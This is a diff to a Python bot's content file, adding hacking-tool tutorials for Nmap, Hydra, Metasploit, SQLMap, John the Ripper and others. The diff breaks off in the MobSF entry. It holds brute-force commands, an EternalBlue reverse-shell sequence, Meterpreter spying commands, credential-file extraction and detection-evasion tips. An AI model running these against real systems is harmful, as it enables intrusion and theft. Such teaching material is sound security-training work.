@@ -6,7 +6,6 @@ from dotenv import load_dotenv
 load_dotenv()
 
 TOKEN = os.getenv("BOT_TOKEN")
-
 # Topics configuration
 topics = {
     "main": [
@@ -305,59 +304,738 @@ content = {
 
     "tools": "*🧰 Tools & Software Submenu:*\n\nSelect a tool to explore installation, real-world usage, examples, and pro tips.",
 
-    "nmap": "*🔍 Nmap* – Port Scanner & Discovery Tool\n\n🛠 Install:\n`sudo apt install nmap`\n\n🔎 Usage Examples:\n"
-            "`nmap -sS 192.168.1.0/24` (TCP SYN scan)\n"
-            "`nmap -sV -p 1-1000 target.com` (service/version detection)\n"
-            "`nmap -O target.com` (OS detection)\n\n💡 Tip: Use NSE scripts (`--script vuln`) for vulnerability scanning.",
+    "nmap": "*🔍 Nmap* – Network Scanner & Port Mapper\n\n"
+            "🧠 *What is Nmap?*\n"
+            "Nmap (Network Mapper) is a powerful open-source tool for network discovery, security auditing, and enumeration.\n"
+            "It scans systems to identify open ports, running services, OS versions, and possible vulnerabilities.\n\n"
 
-    "wireshark": "*🌐 Wireshark* – Network Packets Analyzer\n\n🛠 Install:\n`sudo apt install wireshark`\n\n🧪 Usage Steps:\n"
-                 "- Start GUI, choose interface\n"
-                 "- Apply filters like `http`, `tcp.port==22`\n"
-                 "- Analyze packet contents (handshakes, payloads)\n\n💡 Tip: Use `tshark` (CLI) for automated captures and analysis.",
+            "🛠 *Installation:*\n"
+            "*Linux (Debian/Ubuntu):*\n"
+            "`sudo apt update && sudo apt install nmap`\n"
+            "*Kali Linux:* Pre-installed\n"
+            "*Windows/macOS:* [https://nmap.org/download.html](https://nmap.org/download.html)\n\n"
 
-    "hydra": "*🔑 Hydra* – Fast Protocol Brute-Forcer\n\n🛠 Install:\n`sudo apt install hydra`\n\n💡 Example Usage:\n"
-             "`hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com`\n"
-             "`hydra -L users.txt -P pass.txt ssh://192.168.1.10`\n\n⚠️ Caution: Respect lockout policies and rate limits.",
+            "📦 *Basic Syntax:*\n"
+            "`nmap [options] <target>`\n"
+            "Examples:\n"
+            "`nmap 192.168.1.1`\n"
+            "`nmap scanme.nmap.org`\n\n"
 
-    "burpsuite": "*🧪 Burp Suite* – Web Security Testing\n\n🛠 Install Community Edition:\n`sudo apt install burpsuite`\n\n⚙️ Setup:\n"
-                 "1. Configure browser proxy to `127.0.0.1:8080`\n"
-                 "2. Open site, capture request in Proxy → Intercept\n"
-                 "3. Send to Repeater/Intruder for fuzzing\n\n💡 Tip: Use Scanner (Pro) or extension like **ActiveScan++**.",
+            "📡 *Basic Scanning Commands:*\n"
+            "- Ping Scan (Check if host is up):\n"
+            "`nmap -sn 192.168.1.0/24`\n"
+            "- Quick Port Scan:\n"
+            "`nmap -F 192.168.1.1`\n"
+            "- Service Version Detection:\n"
+            "`nmap -sV 192.168.1.1`\n"
+            "- Operating System Detection:\n"
+            "`nmap -O 192.168.1.1`\n"
+            "- Full Scan:\n"
+            "`nmap -sS -sV -O -Pn 192.168.1.1`\n\n"
 
-    "metasploit": "*📦 Metasploit Framework* – Exploitation Platform\n\n🛠 Install:\n`sudo apt install metasploit-framework`\n\n🛠 Usage:\n"
-                  "`msfconsole`\n"
-                  "`search exploit/windows/smb`\n"
-                  "`use exploit/...`\n"
-                  "`set RHOSTS, LHOST`\n"
-                  "`run`\n\n💡 Tip: Automate with `resource` scripts or use Metasploit Pro/Web UI.",
+            "🎯 *Useful Scan Types:*\n"
+            "- SYN Scan (Stealth): `-sS`\n"
+            "- UDP Scan: `-sU`\n"
+            "- TCP Connect Scan: `-sT`\n"
+            "- Aggressive Scan: `-A`\n"
+            "- No DNS resolution: `-n`\n"
+            "- Skip ping check: `-Pn`\n\n"
 
-    "nikto": "*🛡️ Nikto* – Web Server Vulnerability Scanner\n\n🛠 Install:\n`sudo apt install nikto`\n\n💡 Usage:\n"
-             "`nikto -h http://target.com`\n"
-             "`nikto -Display V -Tuning 2`\n\nUse in recon phase to uncover vulnerable CGIs, outdated headers.",
+            "🧠 *Targeting Options:*\n"
+            "- Single IP: `192.168.1.10`\n"
+            "- Range: `192.168.1.1-50`\n"
+            "- CIDR: `192.168.1.0/24`\n"
+            "- Hostname: `scanme.nmap.org`\n"
+            "- Input from file: `-iL targets.txt`\n\n"
 
-    "sqlmap": "*🕷️ SQLMap* – Automated SQL Injection Tool\n\n🛠 Install:\n`sudo apt install sqlmap`\n\n💡 Usage:\n"
-              "`sqlmap -u \"http://target.com/page.php?id=1\" --dbs`\n"
-              "`--tables`, `--dump` to extract data\n"
-              "`--os-shell` for remote shell if possible.",
+            "🔍 *Detecting Vulnerabilities:*\n"
+            "Use with NSE scripts:\n"
+            "`nmap --script vuln 192.168.1.1`\n"
+            "Some useful scripts:\n"
+            "- `http-vuln-*`\n"
+            "- `smb-vuln-*`\n"
+            "- `ftp-anon`, `ssh2-enum-algos`\n\n"
 
-    "john": "*🔧 John the Ripper* – Password Cracker\n\n🛠 Install:\n`sudo apt install john`\n\n💡 Usage:\n"
-            "`john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt`\n"
-            "`john --show hashfile.txt` to see cracked passwords\n\nSupports MD5, SHA-1, NTLM, etc.",
+            "📁 *Output Formats:*\n"
+            "- Normal: `-oN scan.txt`\n"
+            "- XML: `-oX scan.xml`\n"
+            "- Grepable: `-oG scan.grep`\n"
+            "- All at once: `-oA fullscan`\n\n"
 
-    "mobsf": "*📱 MobSF* – Mobile App Analysis\n\n🛠 Install:\n```bash\ngit clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git\ncd Mobile-Security-Framework-MobSF\n./setup.sh\n```\n\n🌐 Usage:\n"
-             "Open http://localhost:8000 → upload APK/IPA\n"
-             "Check UI for security reports: sensitive data, insecure API usage\n\n💡 Tip: Run Android emulator for dynamic 분석.",
+            "🧪 *Real-World Practice Tasks:*\n"
+            "✅ Scan your local network for live hosts\n"
+            "✅ Identify open ports and running services on your own system\n"
+            "✅ Use `-A` on a known host to analyze services\n"
+            "✅ Try `--script vuln` against a vulnerable VM like Metasploitable\n\n"
 
-    "ghidra": "*🧰 Ghidra* – Reverse Engineering Tool\n\n🛠 Install:\n"
-              "- Download the ZIP from [ghidra-sre.org](https://ghidra-sre.org)\n"
-              "- Unzip and run `./ghidraRun`\n\n🧩 Usage:\n"
-              "Import executable → browse functions → decompile to Java-like code\n\n💡 Tip: Use Python scripts in Ghidra UI for automated batch analysis.",
+            "🛡️ *Ethical Usage Reminder:*\n"
+            "⚠️ Only scan systems you own or have explicit permission to test.\n"
+            "Unauthorized scanning is illegal and may trigger firewalls or alerts.\n\n"
 
-    "aircrackng": "*📡 Aircrack‑ng* – Wi‑Fi Password Cracker\n\n🛠 Install:\n`sudo apt install aircrack-ng`\n\n🧪 Workflow:\n"
-                  "1. `airmon-ng start wlan0`\n"
-                  "2. Capture: `airodump-ng wlan0mon`\n"
-                  "3. Deauth: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
-                  "4. Crack: `aircrack-ng -w wordlist.txt capture.cap`\n\n💡 Tip: Use `cowpatty` or `hashcat` if GPU cracking.",
+            "💡 *Pro Tips:*\n"
+            "- Combine `-T4` for faster scanning\n"
+            "- Use `--top-ports 100` for common ports\n"
+            "- Chain scans with tools like `Nikto`, `Hydra`, or `Metasploit`\n"
+            "- Use `Zenmap` GUI for visual analysis (if preferred)\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "Nmap is a must-have tool for any ethical hacker, penetration tester, or sysadmin. It uncovers vital details about network infrastructure.\n"
+            "_Explore the invisible. Map the network. Master Nmap._ 🌐🧠",
+
+    "wireshark": "*🌐 Wireshark* – Network Packet Sniffing Tool\n\n"
+            "🧠 *What is Wireshark?*\n"
+            "Wireshark is a powerful open-source packet analyzer used for:\n"
+            "- Network troubleshooting\n"
+            "- Protocol development\n"
+            "- Ethical hacking & traffic inspection\n\n"
+
+            "📦 *Features:*\n"
+            "- Captures real-time network packets\n"
+            "- Decodes protocols (TCP, UDP, HTTP, DNS, ARP, etc.)\n"
+            "- Deep packet inspection with GUI & filters\n\n"
+
+            "🛠 *Installation:*\n"
+            "*Windows/macOS:* [Download](https://www.wireshark.org/download.html)\n"
+            "*Linux (Debian/Ubuntu):*\n"
+            "`sudo apt update && sudo apt install wireshark`\n"
+            "`sudo usermod -aG wireshark $USER && newgrp wireshark`\n\n"
+
+            "📚 *Basic Concepts:*\n"
+            "- *Packet*: Small unit of transmitted data\n"
+            "- *Capture Filter*: Filters packets during capture\n"
+            "- *Display Filter*: Filters after capture\n"
+            "- *Interface*: Network device to monitor (e.g., eth0, wlan0)\n\n"
+
+            "🧪 *How to Start Capturing:*\n"
+            "1. Open Wireshark\n"
+            "2. Choose interface (e.g., wlan0)\n"
+            "3. Click the shark icon to begin\n"
+            "4. Stop with the red square icon\n\n"
+
+            "🎯 *Basic Display Filters:*\n"
+            "`http` – Only HTTP\n"
+            "`tcp` – TCP traffic\n"
+            "`ip.src == 192.168.1.1` – Packets *from* IP\n"
+            "`ip.dst == 192.168.1.100` – Packets *to* IP\n"
+            "`dns` – DNS traffic\n"
+            "`tcp.port == 80` – HTTP port\n\n"
+
+            "🚀 *Capture Filters (before sniffing):*\n"
+            "`tcp port 80` – Only HTTP\n"
+            "`host 192.168.1.1` – Specific IP\n"
+            "`src host 10.0.0.5` – Source IP only\n"
+            "`net 192.168.0.0/24` – IP range\n\n"
+
+            "🔍 *Deep Packet Inspection:*\n"
+            "Click any packet → Expand headers:\n"
+            "- Ethernet II\n"
+            "- Internet Protocol (IP)\n"
+            "- TCP/UDP headers\n"
+            "- HTTP requests/responses\n\n"
+
+            "🧠 *Hacking Use Cases:*\n"
+            "- *Credential Sniffing:* Capture HTTP POST data\n"
+            "- *Session Hijacking:* Look for cookies & tokens\n"
+            "- *DNS Spoof Detection:* Multiple DNS replies\n"
+            "- *MITM Analysis:* Inspect ARP poisoned traffic\n"
+            "- *Backdoor Tracing:* Unknown C2 traffic/ports\n\n"
+
+            "🛡️ *Ethical Guidelines:*\n"
+            "⚠️ Only capture on networks you own or have permission to access.\n"
+            "👨‍⚖️ Unauthorized sniffing is illegal and unethical.\n\n"
+
+            "💻 *Practice Tasks:*\n"
+            "• Capture login to testphp.vulnweb.com using POST filter:\n"
+            "`http.request.method == \"POST\"`\n"
+            "• Detect DNS to 8.8.8.8:\n"
+            "`dns && ip.dst == 8.8.8.8`\n"
+            "• View TCP 3-way handshake:\n"
+            "`tcp.port == 80`\n\n"
+
+            "🛠 *Expert Tips:*\n"
+            "- Save captures as `.pcap`\n"
+            "- Use coloring rules for traffic types\n"
+            "- Combine filters:\n"
+            "`tcp.port == 80 && ip.src == 192.168.1.5`\n"
+            "- Export filtered packets: *File → Export Specified Packets*\n\n"
+
+            "🎓 *Challenges:*\n"
+            "1. Capture and extract queried domain from DNS\n"
+            "2. Identify file download over HTTP\n"
+            "3. Analyze TCP 3-way handshake\n"
+            "4. Save packets to/from specific IP during download\n"
+            "5. Detect SYN scan:\n"
+            "`tcp.flags.syn == 1 && tcp.flags.ack == 0`\n\n"
+
+            "🧩 *Bonus Tool: Tshark (CLI):*\n"
+            "`tshark -i wlan0 -Y \"http\" -T fields -e ip.src -e http.request.uri`\n"
+            "*Analyze .pcap files offline with GUI or CLI*\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "Wireshark gives visibility into raw network traffic, helping ethical hackers spot vulnerabilities, monitor traffic, and reverse engineer attacks.\n"
+            "_Master Wireshark, master the network!_ 🌐🛡️",
+
+    "hydra": "*🔑 Hydra* – Brute Force Login Cracker\n\n"
+            "🧠 *What is Hydra?*\n"
+            "Hydra is a powerful password-cracking tool that supports rapid dictionary attacks against over 50 protocols and services such as FTP, SSH, Telnet, HTTP, SMB, and more.\n\n"
+
+            "🛠 *Installation:*\n"
+            "*Kali Linux:* Pre-installed\n"
+            "*Debian/Ubuntu:*\n"
+            "`sudo apt update && sudo apt install hydra`\n"
+            "*Windows:* Use WSL or install via Cygwin\n\n"
+
+            "📦 *Supported Protocols:*\n"
+            "- FTP, SSH, Telnet\n"
+            "- HTTP/HTTPS, SMB\n"
+            "- RDP, VNC, POP3, IMAP\n"
+            "- MySQL, MSSQL, PostgreSQL, and more\n\n"
+
+            "📚 *Basic Syntax:*\n"
+            "`hydra -L users.txt -P passwords.txt <protocol>://<target>`\n"
+            "Example:\n"
+            "`hydra -L userlist.txt -P passlist.txt ssh://192.168.1.10`\n\n"
+
+            "🔐 *Example Attacks:*\n"
+            "- *FTP Brute Force:*\n"
+            "`hydra -l admin -P rockyou.txt ftp://192.168.1.100`\n\n"
+            "- *SSH Dictionary Attack:*\n"
+            "`hydra -L users.txt -P passwords.txt ssh://192.168.1.105`\n\n"
+            "- *HTTP Form Brute Force:*\n"
+            "`hydra -l admin -P pass.txt 192.168.1.200 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"`\n\n"
+            "- *RDP Attack (slow):*\n"
+            "`hydra -t 1 -V -f -L users.txt -P pass.txt rdp://192.168.1.50`\n\n"
+
+            "⚙️ *Important Flags:*\n"
+            "- `-l` → single username\n"
+            "- `-L` → username list\n"
+            "- `-p` → single password\n"
+            "- `-P` → password list\n"
+            "- `-s` → port number\n"
+            "- `-f` → stop after first valid login\n"
+            "- `-V` → verbose output\n"
+            "- `-t` → tasks (parallel threads)\n\n"
+
+            "📁 *Useful Wordlists:*\n"
+            "- `/usr/share/wordlists/rockyou.txt`\n"
+            "- Custom lists with `cewl`, `crunch`, or `cupp`\n\n"
+
+            "🎯 *Real-World Use Cases:*\n"
+            "✅ Penetration testing SSH login strength\n"
+            "✅ Testing weak FTP credentials on embedded devices\n"
+            "✅ Brute-forcing insecure web logins\n"
+            "✅ Finding default creds in IoT/routers\n\n"
+
+            "🧠 *Tips & Tricks:*\n"
+            "- Always check for rate limiting or CAPTCHA on web logins\n"
+            "- Combine with `nmap` to detect open ports/services before launching attack\n"
+            "- Use proxychains to anonymize (e.g., via Tor)\n"
+            "`proxychains hydra -L users.txt -P pass.txt ssh://target`\n\n"
+
+            "🚨 *Ethical Notice:*\n"
+            "Only use Hydra on systems you *own* or are *authorized* to test.\n"
+            "Unauthorized attacks are *illegal and unethical*.\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "Hydra is a versatile and effective tool for brute-force login testing across many services. With proper targeting and lists, it’s a core tool in every ethical hacker’s arsenal.\n"
+            "_If there's a login, Hydra can try to break in — ethically._ 🔐🧠",
+
+    "burpsuite": "*🧪 Burp Suite* – Web Application Security Testing Tool\n\n"
+                "🧠 *What is Burp Suite?*\n"
+                "Burp Suite is a powerful web vulnerability scanner and proxy tool used by ethical hackers to test and exploit web applications. It allows interception, manipulation, scanning, and exploitation of HTTP/S traffic.\n\n"
+
+                "🛠 *Installation:*\n"
+                "\"- Kali Linux: Pre-installed\"\n"
+                "\"- Debian/Ubuntu: `sudo apt install burpsuite`\"\n"
+                "\"- Windows/macOS: Download from https://portswigger.net/burp\"\n\n"
+
+                "🌐 *How Burp Works:*\n"
+                "\"- Acts as a proxy between your browser and target site\"\n"
+                "\"- Intercepts and modifies HTTP/S requests and responses\"\n"
+                "\"- Analyzes and exploits vulnerabilities like XSS, SQLi, CSRF, etc.\"\n\n"
+
+                "🧩 *Key Components:*\n"
+                "\"- Proxy: Intercept web traffic\"\n"
+                "\"- Repeater: Modify and resend requests\"\n"
+                "\"- Intruder: Automate attacks like brute force\"\n"
+                "\"- Scanner (Pro): Automatically find vulnerabilities\"\n"
+                "\"- Decoder: Encode/decode data (Base64, URL, Hex)\"\n"
+                "\"- Comparer: Compare two requests/responses\"\n"
+                "\"- Extender: Add extensions to increase power\"\n\n"
+
+                "🔧 *Setup Burp Proxy:*\n"
+                "\"- Open Burp → Proxy tab → Intercept → On\"\n"
+                "\"- Set browser proxy to 127.0.0.1:8080\"\n"
+                "\"- Import Burp CA certificate to browser for HTTPS\"\n\n"
+
+                "🛠️ *Basic Usage Workflow:*\n"
+                "\"1. Configure browser to use Burp proxy\"\n"
+                "\"2. Browse the target application\"\n"
+                "\"3. Intercept and inspect traffic in 'Proxy' tab\"\n"
+                "\"4. Send requests to 'Repeater' or 'Intruder'\"\n"
+                "\"5. Modify, replay, brute-force, or scan requests\"\n\n"
+
+                "🎯 *Use Cases for Hackers:*\n"
+                "\"- Bypass client-side validations\"\n"
+                "\"- Find SQL Injection points manually\"\n"
+                "\"- Exploit XSS vulnerabilities\"\n"
+                "\"- Fuzz parameters using Intruder\"\n"
+                "\"- Capture and reuse session tokens\"\n\n"
+
+                "📚 *Practical Tasks:*\n"
+                "✅ Intercept and modify a login POST request\n"
+                "✅ Change a product price in a cart request\n"
+                "✅ Perform brute force using Intruder with wordlist\n"
+                "✅ Replay a CSRF request using Repeater\n"
+                "✅ Analyze cookies and headers for security flaws\n\n"
+
+                "💡 *Pro Tips:*\n"
+                "\"- Use Repeater to understand backend responses\"\n"
+                "\"- Use extensions like 'AuthMatrix', 'Logger++', 'Turbo Intruder'\"\n"
+                "\"- Combine with browser plugins like FoxyProxy\"\n"
+                "\"- Use Burp Collaborator to detect blind vulnerabilities\"\n\n"
+
+                "🚨 *Legal Note:*\n"
+                "Only test applications that you own or are authorized to assess.\n"
+                "Unauthorized scanning and interception is illegal.\n\n"
+
+                "🏁 *Conclusion:*\n"
+                "Burp Suite is the ultimate toolkit for web app pentesting. Master it and you'll uncover what web developers hide.\n"
+                "_Inspect. Intercept. Exploit – the ethical way._ 🕵️‍♂️🌐",
+
+    "metasploit": "*📦 Metasploit* – The Ultimate Exploitation Framework\n\n"
+                "🧠 *What is Metasploit?*\n"
+                "Metasploit is a powerful exploitation and post-exploitation framework used by ethical hackers to identify, exploit, and validate vulnerabilities.\n"
+                "It includes payload generators, exploit modules, scanners, listeners, and more.\n\n"
+
+                "🛠 *Installation:*\n"
+                "\"- Kali Linux: Pre-installed\"\n"
+                "\"- Ubuntu/Debian: `sudo apt install metasploit-framework`\"\n"
+                "\"- Windows/macOS: https://www.metasploit.com/\"\n\n"
+
+                "🚀 *Start Metasploit:*\n"
+                "`msfconsole`\n"
+                "Wait for it to load the modules.\n\n"
+
+                "🔍 *Basic Workflow:*\n"
+                "\"1. Find a target vulnerability\"\n"
+                "\"2. Select an exploit module\"\n"
+                "\"3. Set the payload (e.g., reverse shell)\"\n"
+                "\"4. Configure options (RHOST, LHOST, PORT, etc.)\"\n"
+                "\"5. Launch the exploit\"\n\n"
+
+                "⚙️ *Example Attack:*\n"
+                "`use exploit/windows/smb/ms17_010_eternalblue`\n"
+                "`set RHOST 192.168.1.105`\n"
+                "`set PAYLOAD windows/x64/meterpreter/reverse_tcp`\n"
+                "`set LHOST 192.168.1.10`\n"
+                "`exploit`\n\n"
+
+                "🧰 *Popular Modules:*\n"
+                "\"- scanners/portscan/tcp\"\n"
+                "\"- exploit/multi/handler\"\n"
+                "\"- auxiliary/gather/search_email_collector\"\n"
+                "\"- post/multi/recon/local_exploit_suggester\"\n\n"
+
+                "📞 *Meterpreter Tips:*\n"
+                "\"- `sysinfo`, `getuid`, `shell`\"\n"
+                "\"- `screenshot`, `webcam_snap`, `keyscan_start`\"\n"
+                "\"- `download`, `upload`, `hashdump`\"\n"
+                "\"- `persistence`, `migrate`, `record_mic`\"\n\n"
+
+                "💡 *Pro Tips:*\n"
+                "\"- Use `search <term>` to find modules\"\n"
+                "\"- Use `info` to see module options\"\n"
+                "\"- Use `check` before `exploit` to verify vulnerability\"\n\n"
+
+                "⚠️ *Legal Warning:*\n"
+                "Only exploit systems you own or are authorized to test. Unauthorized use of Metasploit is illegal.\n\n"
+
+                "🏁 *Conclusion:*\n"
+                "Metasploit is the Swiss Army knife for hackers. Mastering it means mastering exploitation.\n"
+                "_Launch payloads, hack ethically._ ⚔️💻",
+
+    "nikto": "*🛡️ Nikto* – Web Server Vulnerability Scanner\n\n"
+            "🧠 *What is Nikto?*\n"
+            "Nikto is a fast, open-source web server scanner that detects outdated software, security misconfigurations, and vulnerabilities in websites.\n\n"
+
+            "🛠 *Installation:*\n"
+            "\"- Kali Linux: Pre-installed\"\n"
+            "\"- Ubuntu/Debian: `sudo apt install nikto`\"\n"
+            "\"- GitHub: `git clone https://github.com/sullo/nikto.git`\"\n"
+            "\"  Run with: `perl nikto.pl -h <host>`\"\n\n"
+
+            "⚙️ *Basic Usage:*\n"
+            "`nikto -h http://target.com`\n"
+            "`nikto -h 192.168.1.10 -p 8080`\n\n"
+
+            "🎯 *Common Options:*\n"
+            "\"- `-h` → Target host\"\n"
+            "\"- `-p` → Port number\"\n"
+            "\"- `-Tuning` → Specific tests (e.g., XSS, files, injection)\"\n"
+            "\"- `-o` → Output to file\"\n"
+            "\"- `-ssl` → Force SSL scan\"\n\n"
+
+            "🧪 *Examples:*\n"
+            "- Scan for HTTP issues:\n"
+            "`nikto -h http://192.168.1.100`\n"
+            "- Output report to file:\n"
+            "`nikto -h target.com -o scan.txt -Format txt`\n"
+            "- Scan HTTPS site:\n"
+            "`nikto -h https://secure.site`\n\n"
+
+            "📚 *Finds Issues Like:*\n"
+            "\"- Outdated Apache, PHP, IIS versions\"\n"
+            "\"- Dangerous files (e.g., admin.php, test.php)\"\n"
+            "\"- XSS, SQL error messages, headers issues\"\n"
+            "\"- Default credentials, backup files, open directories\"\n\n"
+
+            "💡 *Pro Tips:*\n"
+            "\"- Combine with `Burp` for deep testing\"\n"
+            "\"- Run behind `proxychains` to anonymize\"\n"
+            "\"- Use `-Tuning 123` to focus on injection, XSS, interesting files\"\n\n"
+
+            "⚠️ *Legal Reminder:*\n"
+            "Scan only web apps you own or have written permission to test. Scanning others without consent is illegal.\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "Nikto is a lightweight but powerful web scanner every ethical hacker should use for quick checks.\n"
+            "_Fast, noisy, effective. Scan wisely._ 🌐🔍",
+
+    "sqlmap": "*🕷️ SQLMap* – Automated SQL Injection Tool\n\n"
+            "🧠 *What is SQLMap?*\n"
+            "SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web apps.\n\n"
+
+            "🛠 *Installation:*\n"
+            "\"- Kali Linux: Pre-installed\"\n"
+            "\"- GitHub: `git clone https://github.com/sqlmapproject/sqlmap.git`\"\n"
+            "\"  Run with: `python3 sqlmap.py`\"\n\n"
+
+            "⚙️ *Basic Usage:*\n"
+            "`sqlmap -u \"http://target.com/page.php?id=1\" --batch`\n"
+            "Use `--batch` to run without prompts.\n\n"
+
+            "🎯 *Common Options:*\n"
+            "\"- `--dbs` → List databases\"\n"
+            "\"- `--tables -D <db>` → Show tables in a DB\"\n"
+            "\"- `--columns -T <table> -D <db>` → Show columns\"\n"
+            "\"- `--dump` → Dump data from a table\"\n"
+            "\"- `--os-shell` → Get OS command shell\"\n"
+            "\"- `--risk=3 --level=5` → Deep scanning\"\n\n"
+
+            "🧪 *Example Attacks:*\n"
+            "- List databases:\n"
+            "`sqlmap -u \"http://site.com/item.php?id=2\" --dbs`\n"
+            "- Dump users from DB:\n"
+            "`sqlmap -u \"http://site.com/p.php?id=2\" -D testdb -T users --dump`\n"
+            "- Get SQL shell:\n"
+            "`sqlmap -u \"http://vuln.com/x?id=1\" --sql-shell`\n\n"
+
+            "💡 *Advanced Tips:*\n"
+            "\"- Use `--random-agent` to avoid detection\"\n"
+            "\"- Test cookies with: `--cookie=\"PHPSESSID=xyz\"`\"\n"
+            "\"- Use `-p` to target specific parameter\"\n"
+            "\"- Use `--tor --check-tor` to anonymize via Tor\"\n\n"
+
+            "📁 *Practical Tasks:*\n"
+            "✅ Find SQLi in DVWA or bWAPP\n"
+            "✅ Dump users table from test site\n"
+            "✅ Try `--os-shell` on vulnerable test app\n\n"
+
+            "⚠️ *Ethical Note:*\n"
+            "Only target applications that you have permission to test. Misuse can result in legal consequences.\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "SQLMap automates powerful SQL injection attacks and database extraction. Use it wisely, ethically, and legally.\n"
+            "_Inject smart. Extract carefully._ 🧠🕳️",
+
+    "john": "*🔧 John the Ripper* – Password Cracking Tool\n\n"
+            "🧠 *What is John the Ripper?*\n"
+            "John the Ripper (JtR) is an open-source, fast, and powerful password-cracking tool.\n"
+            "It supports various hash types (MD5, SHA1, NTLM, etc.) and cracks passwords using dictionary, brute-force, and rule-based attacks.\n\n"
+
+            "🛠 *Installation:*\n"
+            "*Debian/Ubuntu:*\n"
+            "`sudo apt update && sudo apt install john`\n"
+            "*Kali Linux:* Pre-installed\n"
+            "*macOS (via Homebrew):*\n"
+            "`brew install john-jumbo`\n\n"
+
+            "📦 *Supported Hash Types:*\n"
+            "- Unix (/etc/shadow)\n"
+            "- Windows LM/NTLM hashes\n"
+            "- MD5, SHA1, SHA256, bcrypt, etc.\n"
+            "- ZIP/RAR/Office files (with jumbo version)\n\n"
+
+            "🔍 *Basic Usage:*\n"
+            "1. Prepare a hash file\n"
+            "2. Run John with a wordlist\n"
+            "`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`\n"
+            "3. View cracked passwords:\n"
+            "`john --show hashes.txt`\n\n"
+
+            "🧪 *Extracting Hashes:*\n"
+            "- *Linux:* `/etc/shadow` (needs root)\n"
+            "`unshadow /etc/passwd /etc/shadow > hashes.txt`\n"
+            "- *Windows (SAM/NTLM):* Use `samdump2` or `impacket-secretsdump`\n\n"
+
+            "🎯 *Modes of Cracking:*\n"
+            "- *Wordlist (dictionary):*\n"
+            "`john --wordlist=rockyou.txt hashes.txt`\n"
+            "- *Incremental (brute-force):*\n"
+            "`john --incremental hashes.txt`\n"
+            "- *Single Mode:* Fastest, uses usernames for guesses\n"
+            "`john --single hashes.txt`\n"
+            "- *Mask Mode:* Targeted brute-force (e.g., 6-digit pins)\n"
+            "`john --mask='?d?d?d?d?d?d' hashes.txt`\n\n"
+
+            "⚙️ *Hash Identification:*\n"
+            "Use *`hashid`* or *`hash-identifier`* tools to detect hash type\n"
+            "`hashid <hash>`\n\n"
+
+            "🛡️ *Example Hash Formats:*\n"
+            "- *MD5:* `5f4dcc3b5aa765d61d8327deb882cf99`\n"
+            "- *SHA1:* `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`\n"
+            "- *NTLM:* `32ed87bdb5fdc5e9cba88547376818d4`\n\n"
+
+            "📚 *Real-World Scenarios:*\n"
+            "1. Crack user passwords from leaked databases\n"
+            "2. Crack WPA handshake hashes (converted to JtR format)\n"
+            "3. Penetration testing post-exploitation (dump and crack)\n"
+            "4. Reverse engineering app password protection\n\n"
+
+            "🎓 *Learn by Doing – Practice Tasks:*\n"
+            "✅ Task 1: Crack a basic MD5 hash using rockyou.txt\n"
+            "✅ Task 2: Create a custom wordlist and crack your own hash\n"
+            "✅ Task 3: Use mask mode to brute-force a 6-digit PIN hash\n"
+            "✅ Task 4: Crack a SAM file dump using NTLM hashes\n"
+            "✅ Task 5: Try a hybrid attack using rules\n\n"
+
+            "🧠 *Advanced Usage:*\n"
+            "- *Custom Rule-Based Cracking:*\n"
+            "`john --rules --wordlist=rockyou.txt hashes.txt`\n"
+            "- *Restore interrupted session:*\n"
+            "`john --restore`\n"
+            "- *Save session:*\n"
+            "`john --session=myattack --wordlist=rockyou.txt hashes.txt`\n\n"
+
+            "🔐 *Cracked Passwords Location:*\n"
+            "`~/.john/john.pot`\n"
+            "Use `john --show hashes.txt` to read it\n\n"
+
+            "📂 *Convert Hashes (if needed):*\n"
+            "Use `tools/` in Jumbo John build:\n"
+            "`zip2john`, `rar2john`, `pdf2john`, `office2john`\n"
+            "Example:\n"
+            "`zip2john secret.zip > zip.hash`\n"
+            "`john --wordlist=rockyou.txt zip.hash`\n\n"
+
+            "🚨 *Ethical Note:*\n"
+            "Only crack hashes in legal, educational, or authorized pentest environments.\n"
+            "Unauthorized cracking is illegal and unethical.\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "John the Ripper is a go-to tool for any ethical hacker or pentester needing to test password strength or crack hashes.\n"
+            "_Mastering JtR means mastering password security._ 🔐🔥",
+
+    "mobsf": "*📱 MobSF (Mobile Security Framework)* – Android/iOS App Analyzer\n\n"
+            "🧠 *What is MobSF?*\n"
+            "MobSF is an automated tool for performing static and dynamic analysis of Android/iOS mobile apps.\n"
+            "It helps in identifying vulnerabilities, exposed components, hardcoded secrets, and more.\n\n"
+
+            "🛠 *Installation (Linux):*\n"
+            "`sudo apt update && sudo apt install git python3 python3-pip`\n"
+            "`git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git`\n"
+            "`cd Mobile-Security-Framework-MobSF`\n"
+            "`./setup.sh`  or `python3 manage.py runserver`\n\n"
+
+            "🌐 *Access Interface:*\n"
+            "After starting server → Open in browser:\n"
+            "`http://127.0.0.1:8000`\n\n"
+
+            "📦 *Supported Files:*\n"
+            "- `.apk` → Android\n"
+            "- `.ipa` → iOS\n"
+            "- `.zip` source folders\n\n"
+
+            "🔍 *Static Analysis Features:*\n"
+            "- Permissions and manifest analysis\n"
+            "- API calls, code review, hardcoded secrets\n"
+            "- Malware signatures, insecure components\n\n"
+
+            "🚀 *Dynamic Analysis (Android):*\n"
+            "- Uses MobSF Android emulator or your device\n"
+            "- Analyze runtime behavior, network calls, dynamic API traces\n"
+            "Upload APK and click *Dynamic Analyzer*\n\n"
+
+            "🛡️ *Security Checks:*\n"
+            "- WebView exposure\n"
+            "- Debuggable apps\n"
+            "- Broken cryptography\n"
+            "- Insecure storage\n"
+            "- Hardcoded API keys and credentials\n\n"
+
+            "📁 *Reports Output:*\n"
+            "- HTML or PDF reports generated automatically\n"
+            "- Can be exported and saved\n\n"
+
+            "🧪 *Use Case for Hackers:*\n"
+            "- Reverse engineering APKs before exploiting\n"
